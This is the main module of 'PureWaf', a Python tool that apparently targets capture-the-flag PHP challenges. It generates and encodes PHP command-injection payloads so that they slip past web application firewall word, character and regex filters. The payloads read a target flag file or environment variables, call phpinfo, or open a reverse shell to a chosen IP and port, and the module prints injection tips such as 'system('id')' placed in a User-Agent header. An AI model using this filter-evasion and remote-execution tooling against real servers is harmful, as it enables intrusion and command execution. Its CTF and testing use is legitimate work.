# main package

import logging
import os
import sys
import time

from . import bypass
from . import bypass_data
from . import utils

version = "1.0-beta_v5"

SPECIAL_UPLOAD_POC_PAYLOAD = bypass_data.SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS[1]
SPECIAL_UPLOAD_POC_EGS = bypass_data.SPECIAL_UPLOAD_POC_EGS
BACKTRACK_LIMIT_POC_EGS = bypass_data.BACKTRACK_LIMIT_POC_EGS


def banner(version_text):
    return rf"""
 ____                      __        __     ___
|  _ \ _   _ _ __ ___      \ \      / /_ _ |  _|
| |_) | | | | '__/ _ \      \ \ /\ / / _` /| |_
|  __/| |_| | | | (_) |      \ V  V / (_| \|  _|
|_|    \__,_|_|  \___/        \_/\_/ \__,_||_|

    [ PureWaf :: Pure You Hate ]
    [ Author  :: Pure Stream ]
    [ Version :: {version_text}]
    [ Github  :: https://github.com/PureStream108/PureWaf ]


"""


def _configure_logger(log_level: str):
    logger = logging.getLogger("PureWaf")
    if not logger.handlers:
        handler = logging.StreamHandler(sys.stdout)
        formatter = logging.Formatter("%(message)s")
        handler.setFormatter(formatter)
        logger.addHandler(handler)

    level_name = (log_level or "INFO").upper()
    if level_name not in ["DEBUG", "INFO", "QUIET"]:
        logger.warning("[!] Invalid log level, using INFO instead.")
        level_name = "INFO"

    show_progress = True
    if level_name == "QUIET":
        logger.setLevel(logging.CRITICAL)
        sys.stdout = open(os.devnull, "w")
        show_progress = False
    else:
        logger.setLevel(getattr(logging, level_name))

    if level_name != "DEBUG":
        import warnings

        warnings.filterwarnings("ignore")

    return logger, show_progress


def _emit_special_payload_egs(logger, payload):
    if payload not in bypass_data.SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS:
        return
    logger.info("Example: ")
    for line in bypass_data.SPECIAL_UPLOAD_POC_EGS.splitlines():
        logger.info(line)


def _extract_regex_pattern(waf_regex: str):
    if not waf_regex:
        return ""
    pattern = waf_regex.strip()
    if pattern.startswith("/") and pattern.count("/") >= 2:
        last = pattern.rfind("/")
        return pattern[1:last]
    return pattern


def _looks_like_backtrack_risk_regex(waf_regex: str):
    pattern = _extract_regex_pattern(waf_regex)
    if not pattern:
        return False

    lowered = pattern.lower()
    if "(?r)" in lowered or "(?0)" in lowered:
        return True

    has_anchors = "^" in pattern and "$" in pattern
    has_greedy_prefix = ".*(" in pattern or ".+(" in pattern
    has_repeat = "*" in pattern or "+" in pattern or "{" in pattern
    has_wide_class = r"\w" in pattern or r"\W" in pattern

    return has_anchors and has_greedy_prefix and has_repeat and has_wide_class


def _emit_contextual_tips(logger, payload, waf_regex):
    _emit_special_payload_egs(logger, payload)

    if payload in bypass_data.HEADER_TIP_TRIGGER_PAYLOADS:
        logger.info("TIPS: User-Agent: 1=system('id');")
        logger.info("TIPS: User-Agent: system('id');")

    if payload in bypass_data.VARIABLE_HIJACK_TIP_TRIGGER_PAYLOADS:
        logger.info("TIPS: POST: 1=system('id');")

    if _looks_like_backtrack_risk_regex(waf_regex):
        logger.info("Example (Backtrack limit bypass):")
        for line in BACKTRACK_LIMIT_POC_EGS.splitlines():
            logger.info(line)


def purewaf(
    waf_words="",
    waf_chars="",
    waf_regex="",
    limit_length=999999,
    flagfile="/flag",
    read_env=False,
    reflect_shell=False,
    port=8080,
    ip="127.0.0.1",
    phpinfo=False,
    log_level="INFO",
    total_payload=False,
    phpv=7.0,
):
    logger, show_progress = _configure_logger(log_level)
    logger.info(banner(version).rstrip())
    time.sleep(1)

    # 校验版本
    try:
        phpv = float(phpv)
    except (ValueError, TypeError):
        logger.error(f"[!] Invalid php_version: {phpv}. Using default 7.0")
        phpv = 7.0

    # 打印配置
    logger.info("")
    logger.info("-" * 40)
    logger.info(f"[*] Configuration:")
    logger.info(f"    - waf_words: {waf_words}")
    logger.info(f"    - waf_chars: {waf_chars}")
    logger.info(f"    - waf_regex: {waf_regex}")
    logger.info(f"    - limit_length: {limit_length}")
    logger.info(f"    - flagfile: {flagfile}")
    logger.info(f"    - read_env: {read_env}")
    logger.info(f"    - reflect_shell: {reflect_shell}")
    logger.info(f"    - port: {port}")
    logger.info(f"    - ip: {ip}")
    logger.info(f"    - phpinfo: {phpinfo}")
    logger.info(f"    - phpv: {phpv}")
    logger.info(f"    - log_level: {log_level}")
    logger.info(f"    - total_payload: {total_payload}")
    logger.info("-" * 40)
    logger.info("")

    waf_words_list = utils.parse_waf_words(waf_words)
    waf_chars_set = utils.parse_waf_chars(waf_chars)
    waf_regex_obj = utils.parse_waf_regex(waf_regex)

    options_root = bypass.BypassOptions(
        flagfile="/",  # 初始默认根目录
        read_env=False,
        reflect_shell=False,
        ip=ip,
        port=port,
        phpinfo=False,
        php_version=phpv,
    )

    options_flag = bypass.BypassOptions(
        flagfile=flagfile,
        read_env=read_env,
        reflect_shell=reflect_shell,
        ip=ip,
        port=port,
        phpinfo=phpinfo,
        php_version=phpv,
    )

    # 生成 payload
    logger.info("[*] Generating payloads for Root Directory...")
    base_payloads_root = bypass.generate_candidates(options_root)
    if not base_payloads_root:
        logger.warning("[!] No base payloads generated for Root Directory.")
        shortest_root = "N/A"
    else:
        strategies = utils.get_encoding_strategies()
        encoded_payloads_root = bypass.apply_encodings(base_payloads_root, strategies)
        passed_root = bypass.filter_payloads(
            encoded_payloads_root,
            waf_words_list,
            waf_chars_set,
            waf_regex_obj,
            limit_length,
            show_progress=show_progress,
            verbose=total_payload,
        )
        if not passed_root:
            logger.warning("[!] No payload passed WAF filters for Root Directory.")
            shortest_root = "N/A"
        else:
            shortest_root = min(passed_root, key=len)

    logger.info("")

    logger.info("[*] Generating payloads for Flag File...")
    base_payloads_flag = bypass.generate_candidates(options_flag)
    if not base_payloads_flag:
        logger.warning("[!] No base payloads generated for Flag File.")
        shortest_flag = "N/A"
    else:
        encoded_payloads_flag = bypass.apply_encodings(base_payloads_flag, strategies)
        passed_flag = bypass.filter_payloads(
            encoded_payloads_flag,
            waf_words_list,
            waf_chars_set,
            waf_regex_obj,
            limit_length,
            show_progress=show_progress,
            verbose=total_payload,
        )
        if not passed_flag:
            logger.warning("[!] No payload passed WAF filters for Flag File.")
            shortest_flag = "N/A"
        else:
            shortest_flag = min(passed_flag, key=len)

    logger.info("")
    logger.info("-" * 40)
    logger.info(f"[+] Shortest Root Payload : {shortest_root}")
    logger.info(f"[+] Shortest Flag Payload : {shortest_flag}")
    logger.info("-" * 40)
    logger.info("")
    _emit_contextual_tips(logger, shortest_flag, waf_regex)
    logger.info("")

    return shortest_flag


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="PureWaf - WAF Bypass Payload Generator")
    parser.add_argument("--waf_words", default="", help="Comma separated forbidden words")
    parser.add_argument("--waf_chars", default="", help="Forbidden characters")
    parser.add_argument("--waf_regex", default="", help="Forbidden regex")
    parser.add_argument("--limit_length", type=int, default=999999, help="Max payload length")
    parser.add_argument("--flagfile", default="/flag", help="Target file to read")
    parser.add_argument("--read_env", action="store_true", help="Generate env reading payloads")
    parser.add_argument("--reflect_shell", action="store_true", help="Generate reverse shell payloads")
    parser.add_argument("--port", type=int, default=8080, help="Reverse shell port")
    parser.add_argument("--ip", default="127.0.0.1", help="Reverse shell IP")
    parser.add_argument("--phpinfo", action="store_true", help="Generate phpinfo payloads")
    parser.add_argument("--log_level", default="INFO", help="Log level")
    parser.add_argument("--total_payload", action="store_true", help="Show all passed payloads")
    parser.add_argument("--phpv", default=7.0, type=float, help="PHP Version (e.g. 5.6, 7.4)")

    args = parser.parse_args()
    purewaf(**vars(args))
